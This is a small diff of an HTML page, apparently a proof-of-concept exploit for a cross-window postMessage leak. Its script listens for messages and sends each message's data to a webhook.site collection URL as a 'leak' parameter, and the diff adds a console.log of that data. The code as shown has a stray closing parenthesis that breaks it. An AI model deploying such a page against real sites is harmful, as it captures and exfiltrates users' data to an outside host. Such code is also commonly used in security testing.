@@ -2,6 +2,7 @@
 <body>
     <script>
         window.addEventListener("message",function(event)){
+            console.log(event.data);
             var xhr = new XMLHttpRequest();
             xhr.open("GET","https://webhook.site/81894586-c5d3-4409-aaa8-85442faed622?leak="+event.data,true);
             xhr.send();
